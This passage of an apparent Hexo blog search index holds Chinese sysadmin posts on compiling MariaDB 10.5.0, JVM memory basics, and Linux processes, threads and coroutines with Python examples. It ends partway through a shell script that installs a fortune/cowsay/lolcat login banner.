<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mariadb 10.5.0 编译安装</title>
      <link href="2020/12/04/mariadb_10.5.0_%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/"/>
      <url>2020/12/04/mariadb_10.5.0_%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@mariadb ~]# hostnamectl </span><br><span class="line">   Static hostname: mariadb</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: 5330a01e60544f83bcd3032f4d7ae3e0</span><br><span class="line">           Boot ID: 8742c4969d32455c8028eefd27557d74</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: CentOS Linux 7 (Core)</span><br><span class="line">       CPE OS Name: cpe:&#x2F;o:centos:centos:7</span><br><span class="line">            Kernel: Linux 3.10.0-957.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="安装依赖环境"><a href="#安装依赖环境" class="headerlink" title="安装依赖环境"></a>安装依赖环境</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@mariadb ~]# yum -y install openssl openssl-devel ncurses ncurses-devel bison bison-devel jemalloc jemalloc-devel centos-release-scl devtoolset-7  gcc gcc-c++ cmake</span><br><span class="line">[root@mariadb ~]# cmake -version</span><br><span class="line">cmake version 2.8.12.2</span><br></pre></td></tr></table></figure><h4 id="下载源码包-编译安装"><a href="#下载源码包-编译安装" class="headerlink" title="下载源码包/编译安装"></a>下载源码包/编译安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@mariadb ~]# wget https:&#x2F;&#x2F;downloads.mariadb.org&#x2F;interstitial&#x2F;mariadb-10.5.0&#x2F;source&#x2F;mariadb-10.5.0.tar.gz</span><br><span class="line">[root@mariadb ~]# tar xf mariadb-10.5.0.tar.gz</span><br><span class="line">[root@mariadb ~]# cd mariadb-10.5.0</span><br><span class="line">[root@mariadb ~]# sed -i &quot;s@data&#x2F;test@\$&#123;INSTALL_MYSQLTESTDIR&#125;@g&quot; sql&#x2F;CMakeLists.txt &amp;&amp;</span><br><span class="line">mkdir build &amp;&amp;</span><br><span class="line">cd    build &amp;&amp;</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE&#x3D;Release                      \</span><br><span class="line">      -DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mariadb          \</span><br><span class="line">      -DINSTALL_DOCDIR&#x3D;share&#x2F;doc&#x2F;mariadb-10.5.0       \</span><br><span class="line">      -DINSTALL_DOCREADMEDIR&#x3D;share&#x2F;doc&#x2F;mariadb-10.5.0 \</span><br><span class="line">      -DINSTALL_MANDIR&#x3D;share&#x2F;man                      \</span><br><span class="line">      -DINSTALL_MYSQLSHAREDIR&#x3D;share&#x2F;mysql             \</span><br><span class="line">      -DINSTALL_MYSQLTESTDIR&#x3D;share&#x2F;mysql&#x2F;test         \</span><br><span class="line">      -DINSTALL_PLUGINDIR&#x3D;lib&#x2F;mysql&#x2F;plugin            \</span><br><span class="line">      -DINSTALL_SBINDIR&#x3D;sbin                          \</span><br><span class="line">      -DINSTALL_SCRIPTDIR&#x3D;bin                         \</span><br><span class="line">      -DINSTALL_SQLBENCHDIR&#x3D;share&#x2F;mysql&#x2F;bench         \</span><br><span class="line">      -DINSTALL_SUPPORTFILESDIR&#x3D;share&#x2F;mysql           \</span><br><span class="line">      -DMYSQL_DATADIR&#x3D;&#x2F;data                    \</span><br><span class="line">      -DMYSQL_UNIX_ADDR&#x3D;&#x2F;tmp&#x2F;mysql.sock       \</span><br><span class="line">      -DWITH_EXTRA_CHARSETS&#x3D;complex                   \</span><br><span class="line">      -DWITH_EMBEDDED_SERVER&#x3D;ON                       \</span><br><span class="line">      -DSKIP_TESTS&#x3D;ON                                 \</span><br><span class="line">      -DTOKUDB_OK&#x3D;0                                   \</span><br><span class="line">      .. &amp;&amp;</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h4 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@mariadb ~]# vim &#x2F;etc&#x2F;my.cnf</span><br><span class="line">[root@mariadb ~]# mkdir &#x2F;auth_pam_tool_dir &#x2F;var&#x2F;log&#x2F;mariadb </span><br><span class="line">[root@mariadb ~]# touch &#x2F;auth_pam_tool_dir&#x2F;auth_pam_tool  &amp;&amp; chown mysql.mysql &#x2F;auth_pam_tool_dir -R  &amp;&amp; chown mysql.mysql &#x2F;var&#x2F;log&#x2F;mariadb</span><br><span class="line">[root@mariadb ~]# mysql_install_db --basedir&#x3D;&#x2F;usr --datadir&#x3D;&#x2F;srv&#x2F;mysql --user&#x3D;mysql &amp;&amp; chown mysql.mysql &#x2F;srv&#x2F;mysql -R</span><br><span class="line">配置文件</span><br><span class="line">[client]</span><br><span class="line">#password       &#x3D; your_password</span><br><span class="line">port            &#x3D; 3306</span><br><span class="line">socket          &#x3D; &#x2F;run&#x2F;mysqld&#x2F;mysqld.sock</span><br><span class="line"># The MySQL server</span><br><span class="line">[mysqld]</span><br><span class="line">port            &#x3D; 3306</span><br><span class="line">socket          &#x3D; &#x2F;run&#x2F;mysqld&#x2F;mysqld.sock</span><br><span class="line">datadir         &#x3D; &#x2F;srv&#x2F;mysql</span><br><span class="line">log-error &#x3D; &#x2F;var&#x2F;log&#x2F;mariadb&#x2F;mariadb.log</span><br><span class="line">server-id       &#x3D; 1</span><br><span class="line">innodb_data_home_dir &#x3D; &#x2F;data</span><br><span class="line">innodb_log_group_home_dir &#x3D; &#x2F;data</span><br><span class="line">innodb_data_file_path &#x3D; ibdata1:12M:autoextend</span><br><span class="line">innodb_buffer_pool_size &#x3D; 128M</span><br><span class="line">innodb_log_file_size &#x3D; 48M</span><br><span class="line">innodb_log_buffer_size &#x3D; 16M</span><br><span class="line">innodb_flush_log_at_trx_commit &#x3D; 1</span><br><span class="line">innodb_lock_wait_timeout &#x3D; 50</span><br><span class="line">[mysqldump]</span><br><span class="line">quick</span><br><span class="line">max_allowed_packet &#x3D; 16M</span><br><span class="line">[isamchk]</span><br><span class="line">key_buffer &#x3D; 20M</span><br><span class="line">sort_buffer_size &#x3D; 20M</span><br><span class="line">read_buffer &#x3D; 2M</span><br><span class="line">write_buffer &#x3D; 2M</span><br><span class="line">[myisamchk]</span><br><span class="line">key_buffer_size &#x3D; 20M</span><br><span class="line">sort_buffer_size &#x3D; 20M</span><br><span class="line">read_buffer &#x3D; 2M</span><br><span class="line">write_buffer &#x3D; 2M</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">[root@mariadb ~]#  mysqld_safe --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;mysql &amp;</span><br><span class="line">停止</span><br><span class="line">[root@mariadb ~]#  mysqladmin -p&#39;*****&#39;  shutdown</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 存储 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM 工作原理</title>
      <link href="2020/12/04/JVM%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BC%98%E5%8C%96/"/>
      <url>2020/12/04/JVM%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="JVM-工作原理"><a href="#JVM-工作原理" class="headerlink" title="JVM 工作原理"></a>JVM 工作原理</h1><ul><li><p>JVM 全称  JAVA Virtual Machine (java虚拟机)，通过计算来模拟各种计算机功能实现。jvm主要有字节码指令集，寄存器，栈，垃圾回收堆，存储方法域构成。</p></li><li><p>JVM伴随JAVA程序启动而执行，程序结束则关闭，一个JAVA程序就会开启一个JVM虚拟机进程，可以通过jps命令查看。一台服务器上可以运行多个程序，启动多个jvm进程。</p></li><li><p>JVM将线程分为两种：守护线程和普通线程。守护线程是JVM自己使用的线程，比如垃圾回收（GC）就是一个守护线程。普通线程一般是Java程序的线程，只要JVM中有普通线程在执行，那么JVM就不会停止。<br><img src="https://img-blog.csdnimg.cn/20191225110003185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图中绿色部分表示各个线程私有，白色部分为共享。</p></li><li><p>JVM的堆内存<br><img src="https://img-blog.csdnimg.cn/20191225110212654.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        JVM虚拟机有3部分构成，新生代、老年带、永久代(方法区,1.8之前，1.8之后已经废弃永久代)，其中，新生代有3个部分组成，1个伊甸园区域，两个存活区(也叫幸存区)比例为 8：1：1</span><br><span class="line">方法区</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/laoqing/p/8583583.html">gc垃圾回收机制优化</a></p><h1 id="jvm-内存优化"><a href="#jvm-内存优化" class="headerlink" title="jvm 内存优化"></a>jvm 内存优化</h1></li><li><p> JAVA_OPTS=”$JAVA_OPTS -Xms1024m -Xmx1024m 生产环境下大概调整带物理内存一半</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> jvm </tag>
            
            <tag> java </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 进程、线程、协程解析</title>
      <link href="2020/12/04/Linux-%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%81%E5%8D%8F%E7%A8%8B/"/>
      <url>2020/12/04/Linux-%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%81%E5%8D%8F%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文中代码示例： python</p></blockquote><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><blockquote><p>服务器进程管理：<br>        进程，直观点说，保存在硬盘上的程序运行以后，会在内存空间里形成一个独立的内存体，这个内存体有自己独立的地址空间，有自己的堆，上级挂靠单位是操作系统。操作系统会以进程为单位，分配系统资源（CPU时间片、内存等资源），进程是资源分配的最小单位。<br>进程之间通信：<br>        管道(Pipe)、命名管道(FIFO)、消息队列(Message Queue) 、信号量(Semaphore) 、共享内存（Shared Memory）；套接字（Socket）。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020090215243011.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span>(<span class="params">text</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;当前进程：&#x27;</span>,os.getpid())</span><br><span class="line">    print(<span class="string">&#x27;当前父进程：&#x27;</span>,os.getppid())</span><br><span class="line">    print(<span class="string">&#x27;我是子进程&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">&#x27;子进程结束&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">f&#x27;我的进程: <span class="subst">&#123;os.getpid()&#125;</span>&#x27;</span>)</span><br><span class="line">    print(<span class="string">f&#x27;我的父进程: <span class="subst">&#123;os.getppid()&#125;</span>&#x27;</span>)</span><br><span class="line">    pro = Process(target=process, args=(<span class="string">&#x27;hello world&#x27;</span>,))</span><br><span class="line">    pro.start()</span><br><span class="line">    pro.join()</span><br><span class="line">    print(<span class="string">&#x27;父进程结束&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><blockquote><p>线程，又称为轻量级进程(Lightweight Process，LWP），是操作系统调度（CPU调度）执行的最小单位。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200902153925816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,current_thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">text</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;我是：&#x27;</span>,current_thread.__name__)</span><br><span class="line">    print(<span class="string">&#x27;子进程开始&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">&#x27;子进程结束&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;我是父进程&#x27;</span>)</span><br><span class="line">    t = Thread(target=thread, args=(<span class="string">&#x27;hello world&#x27;</span>,))</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line">    print(<span class="string">&#x27;父进程结束&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="线程进程的区别"><a href="#线程进程的区别" class="headerlink" title="线程进程的区别"></a>线程进程的区别</h3><blockquote><p> 【区别】：<br>调度：线程作为调度和分配的基本单位，进程作为拥有资源的基本单位；<br>并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可并发执行；<br>拥有资源：进程是拥有资源的一个独立单位，线程不拥有系统资源，但可以访问隶属于进程的资源。进程所维护的是程序所包含的资源（静态资源）， 如：地址空间，打开的文件句柄集，文件系统状态，信号处理handler等；线程所维护的运行相关的资源（动态资源），如：运行栈，调度相关的控制信息，待处理的信号集等；<br>系统开销：在创建或撤消进程时，由于系统都要为之分配和回收资源，导致系统的开销明显大于创建或撤消线程时的开销。但是进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个进程死掉就等于所有的线程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。<br>【联系】：<br>一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程；<br>资源分配给进程，同一进程的所有线程共享该进程的所有资源；<br>处理机分给线程，即真正在处理机上运行的是线程；<br>线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的办法实现同步。</p></blockquote><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p><img src="https://img-blog.csdnimg.cn/20200902155406733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><blockquote><p>协程，是一种比线程更加轻量级的存在，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。</p></blockquote><blockquote><p>极高的执行效率：因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显；</p></blockquote><blockquote><p>不需要多线程的锁机制：因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不加锁，只需要判断状态就好了，所以执行效率比多线程高很多。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">f&#x27;正在制作第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>个包子&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">f&#x27;正在享用第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>个包子&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    m = make(<span class="number">10</span>)</span><br><span class="line">    e = eat(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            print(m.__next__())</span><br><span class="line">            print(e.__next__())</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;任务完成&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="亲缘性"><a href="#亲缘性" class="headerlink" title="亲缘性"></a>亲缘性</h3><blockquote><p>  使用CPU亲缘性的好处：设置CPU亲缘性是为了防止进程/线程在CPU的核上频繁切换，从而避免因切换带来的CPU的L1/L2 cache失效，cache失效会降低程序的性能。</p></blockquote><h3 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h3><p>Linux进程状态：R (TASK_RUNNING)，可执行状态&amp;运行状态(在run_queue队列里的状态)</p><p>Linux进程状态：S (TASK_INTERRUPTIBLE)，可中断的睡眠状态, 可处理signal</p><p>Linux进程状态：D (TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态,　可处理signal,　有延迟</p><p>Linux进程状态：T (TASK_STOPPED or TASK_TRACED)，暂停状态或跟踪状态,　不可处理signal,　因为根本没有时间片运行代码</p><p>Linux进程状态：Z (TASK_DEAD - EXIT_ZOMBIE)，退出状态，进程成为僵尸进程。不可被kill,　即不响应任务信号,　无法用SIGKILL杀死</p><h5 id="状态后缀标识"><a href="#状态后缀标识" class="headerlink" title="状态后缀标识"></a>状态后缀标识</h5><p>&lt;：优先级高的进程</p><p>N：优先级低的进程</p><p>L：有些页被锁进内存</p><p>s：进程的领导者（在它之下有子进程）</p><p>l：ismulti-threaded (using CLONE_THREAD, like NPTL pthreads do)</p><p>+：位于后台的进程组</p><h3 id="Linux-查看进程状态"><a href="#Linux-查看进程状态" class="headerlink" title="Linux 查看进程状态"></a>Linux 查看进程状态</h3><p><code>netstat -n | awk &#39;/^tcp/ &#123;++S[$NF]&#125; END &#123;for（a in S） print a, S[a]&#125;&#39;</code></p><h3 id="杀死僵尸进程"><a href="#杀死僵尸进程" class="headerlink" title="杀死僵尸进程"></a>杀死僵尸进程</h3><blockquote><p>僵尸进程指已经结束的进程，父进程没有调用wait pid 将他结束，可以通过杀死其父进程的方式杀死僵尸进程，ps -ef |grep</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>1、ps</p><blockquote><p>ps是Linux 中最基础的浏览系统中的进程的命令。能列出系统中运行的进程，包括进程号、命令、CPU使用量、内存使用量等。下述选项可以得到更多有用的消息。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ef |grep - 列出需要进程</span><br><span class="line">ps -aux - 显示进程信息，包括无终端的（x）和针对用户（u）的进程：如USER, PID, %CPU, %MEM等</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200903092949863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>2、top/htop</p><blockquote><p>操作方法： 略<br>参数了解：<br>第一行：启动时间、登录用户、cpu负载<br>第二行：总进程数、运行进程、休眠进程、停止进程、僵尸进程<br>第三行：<br>us：用户态进程，运行(未调整优先级的) 用户进程的CPU时间<br>sy：内核态进程，运行内核进程的CPU时间<br>ni：进程优先级运行已调整优先级的用户进程的CPU时间<br>wa：IO wait，用于等待IO完成的CPU时间<br>hi：处理硬件中断的CPU时间<br>si：处理软件中断的CPU时间<br>st：这个虚拟机被VMM偷去的CPU时间（如果当前处于一个VMM下的guestos，实际上VMM也是要消耗一部分CPU处理时间）。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200903093011306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200903094504239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>3、lsof</p><blockquote><p>lsof -i[46] [protocol][@hostname|hostaddr][:service|port]</p></blockquote><p><code>lsof -i:3306 # 查看哪个进程占用了3306端口</code><br><code>lsof -i:mysql # 查看mysql服务</code><br><code>lsof -i TCP # 查看TCP连接，UDP同理</code><br><img src="https://img-blog.csdnimg.cn/202009030949284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>lsof -u mysql # 查看用户打开了什么，^mysql 取反</code><br><img src="https://img-blog.csdnimg.cn/20200903095253271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>lsof -p 1663 # 查看pid 的内容</code><br><img src="https://img-blog.csdnimg.cn/20200903095435268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>lsof /var/lib/mysql/mysql.sock # 显示与目录或文件交互的信息</code><br><img src="https://img-blog.csdnimg.cn/20200903095617850.png#pic_center" alt="在这里插入图片描述"><br>4、ipcs<br><img src="https://img-blog.csdnimg.cn/20200903095832736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="修改系统的nice值"><a href="#修改系统的nice值" class="headerlink" title="修改系统的nice值"></a>修改系统的nice值</h3><blockquote><p>查看进程优先级<br><img src="https://img-blog.csdnimg.cn/20200903100231385.png#pic_center" alt="在这里插入图片描述"><br>pri 为进程的优先级，数值越小，优先级越高<br>nice 不是优先级，而是优先级的修正参数，当nice值为负数，说明优先级会变得更高<br>优先级 = 优先级 + nice值</p></blockquote><h5 id="nice命令"><a href="#nice命令" class="headerlink" title="nice命令"></a>nice命令</h5><blockquote><p>设置nice 值，在进程启动时执行<br><code>nice -n -10 systemctl start mysql </code></p></blockquote><h5 id="renice命令"><a href="#renice命令" class="headerlink" title="renice命令"></a>renice命令</h5><blockquote><p>设置nice值，在进程运行中执行<br><code>renice -5 10000 # 将pid 为10000的进程nice值设置为-5 如果优先级为80 那么实际就是78</code></p></blockquote><h3 id="进程调度策略"><a href="#进程调度策略" class="headerlink" title="进程调度策略"></a>进程调度策略</h3><p><img src="https://img-blog.csdnimg.cn/20200903101626308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ul><li>SCHED_OTHER，分时调度策略</li><li>SCHED_FIFO，实时调度策略，先到先服务</li><li>SCHED_RR，实时调度策略，时间片轮转 </li></ul><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><blockquote><p>[1]        SIGHUP         重新加载配置  PID不变<br>[2]      SIGINT           键盘中断^C<br>[3]        SIGQUIT        键盘退出<br>[9]        SIGKILL          强制终止<br>[15]    SIGTERM     终止（正常结束），缺省信号<br>[18]    SIGCONT     继续<br>[19]    SIGSTOP      停止<br>[20]    SIGTSTP      暂停^Z</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Linux </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lolcat 输出彩色格言</title>
      <link href="2020/12/04/Linux__lolcat%E8%BE%93%E5%87%BA%E5%BD%A9%E8%89%B2%E6%A0%BC%E8%A8%80/"/>
      <url>2020/12/04/Linux__lolcat%E8%BE%93%E5%87%BA%E5%BD%A9%E8%89%B2%E6%A0%BC%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载fortune 格言信息</span></span><br><span class="line">yum install -y fortune-mod-1.99.1-17.el7.x86_64</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载会说话的小动物插件</span></span><br><span class="line">yum install -y cowsay</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载大字插件</span></span><br><span class="line">yum install -y figlet</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载格言包 内含4个语言包 英文格言、中文格言、唐诗、宋词</span></span><br><span class="line">git clone https://github.com/ruanyf/fortunes.git</span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加索引信息</span></span><br><span class="line">strfile fortunes/data/fortunes</span><br><span class="line">strfile fortunes/data/chinese</span><br><span class="line">strfile fortunes/data/tang300</span><br><span class="line">strfile fortunes/data/song100</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将语言包拷贝到默认位置</span></span><br><span class="line">\cp -rf fortunes/data/* /usr/share/games/fortune/</span><br><span class="line">cat &gt;&gt; /etc/profile.d/hello.sh &lt;&lt;EOF</span><br><span class="line">fortune -e tang300 song100 chinese fortunes | cowsay |lolcat -a -d 10</span><br><span class="line">figlet I am $USER |lolcat -a -d 10</span><br><span class="line">EOF</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>安装lolcat</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/bash</span> </span><br><span class="line">. /etc/init.d/functions</span><br><span class="line">dp=`pwd`</span><br><span class="line">function path()&#123;</span><br><span class="line">if [[ -f &#x27;/etc/centos-release&#x27; ]];then</span><br><span class="line">echo &quot;脚本运行 centos redhat系统&quot;</span><br><span class="line">else</span><br><span class="line">echo_failure || echo &quot;未知操作系统&quot;</span><br><span class="line">fi</span><br><span class="line">ip=`hostname -I`</span><br><span class="line">echo &quot;当前ip：$ip&quot;</span><br><span class="line">echo &quot;正在进行环境监测。。。&quot;</span><br><span class="line">if [[ $dp != &#x27;/opt&#x27; ]];then</span><br><span class="line">echo_failure || echo &quot;请在/opt 目录下运行此脚本&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line">if [[ $UID -ne 0 ]];then</span><br><span class="line">echo_failure || echo &quot;请使用root登录&quot;</span><br><span class="line">exit 1</span><br><span class="line">else</span><br><span class="line">echo_success &amp;&amp; echo &quot;用户&quot;</span><br><span class="line">sleep 1</span><br><span class="line">fi</span><br><span class="line">ping -W1 -c1 114.114.114.114 &amp;&gt; /dev/null</span><br><span class="line">if [[ $? -ne 0 ]];then</span><br><span class="line">echo_failure || echo &quot;网络错误，请检查网络&quot;</span><br><span class="line">exit 1</span><br><span class="line">else</span><br><span class="line">echo_success &amp;&amp; echo &quot;网络&quot;</span><br><span class="line">sleep 1</span><br><span class="line">fi</span><br><span class="line">yum repolist &amp;&gt; /dev/null</span><br><span class="line">if [[ $? -ne 0 ]];then</span><br><span class="line">echo_failure &amp;&amp; echo &quot;yum服务错误&quot;</span><br><span class="line">exit 1</span><br><span class="line">else</span><br><span class="line">echo_success &amp;&amp; echo &quot;yum&quot;</span><br><span class="line">sleep 1</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line">function lolcat_down()&#123;</span><br><span class="line">yum list |grep ruby &amp;&gt;/dev/null</span><br><span class="line">if [[ $? -ne 0 ]];then</span><br><span class="line">echo_failure || echo &quot;缺少依赖软件ruby&quot;</span><br><span class="line">exit 2</span><br><span 